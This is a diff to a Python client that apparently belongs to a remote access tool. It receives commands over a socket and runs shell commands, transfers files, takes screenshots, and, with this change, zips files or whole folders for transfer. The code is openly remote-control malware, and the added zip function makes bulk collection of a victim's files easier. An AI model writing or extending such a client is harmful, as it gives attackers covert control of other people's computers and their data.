@@ -5,6 +5,8 @@ import subprocess
 import base64
 import socket
 import sys
+import os
+import zipfile
 # non-standard libraries
 import mss
 
@@ -17,16 +19,18 @@ class Client:
         while not self.exit:
             received = self.connection.recv(self.connection.sock).decode(self.connection.CODEC)
             command = received[0]
-            attribute = received[1:]
+            attribute = received[1:].split(" @ ")
 
             if command == "c":
-                self.execute_command(attribute.split()[0], attribute[len(attribute.split()[0]):])
+                self.execute_command(attribute[0].split()[0], attribute[0][len(attribute[0].split()[0]):])
             elif command == "d":
-                self.download_file(attribute)
+                self.download_file(attribute[0])
             elif command == "u":
-                self.upload_file(attribute)
+                self.upload_file(attribute[0])
             elif command == "s":
-                self.make_screenshot(attribute.split()[0], attribute.split()[1])
+                self.make_screenshot(attribute[0].split()[0], attribute[0][len(attribute[0].split()[0]):])
+            elif command == "z":
+                self.zip_file_or_folder(attribute[0][0], attribute[0][1:], attribute[1])
             elif command == "r":
                 self.connection.sock.close()
                 self.exit = True
@@ -75,6 +79,22 @@ class Client:
             error = "[-] FileNotFoundError"
         self.connection.send(error.encode(self.connection.CODEC), self.connection.sock)
 
+    def zip_file_or_folder(self, compression_level, path_to_open, path_to_save):
+        print("comp_lvl", compression_level)
+        print("open", path_to_open)
+        print("save", path_to_save)
+        error = "no error"
+        zip_file = zipfile.ZipFile(path_to_save, 'w', zipfile.ZIP_DEFLATED, compresslevel=int(compression_level))
+        if os.path.isdir(path_to_open):
+            relative_path = os.path.dirname(path_to_open)
+            for root, dirs, files in os.walk(path_to_open):
+                for file in files:
+                    zip_file.write(os.path.join(root, file), os.path.join(root, file).replace(relative_path, '', 1))
+        else:
+            zip_file.write(path_to_open, os.path.basename(path_to_open))
+        zip_file.close()
+        self.connection.send(error.encode(self.connection.CODEC), self.connection.sock)
+
 
 class Connection:
     def __init__(self):
@@ -114,9 +134,9 @@ class Connection:
 
 if __name__ == "__main__":
     while True:
-        try:
-            client = Client()
-            if client.exit:
-                break
-        except:
-            pass
+        #try:
+        client = Client()
+            #if client.exit:
+                #break
+        #except:
+            #pass
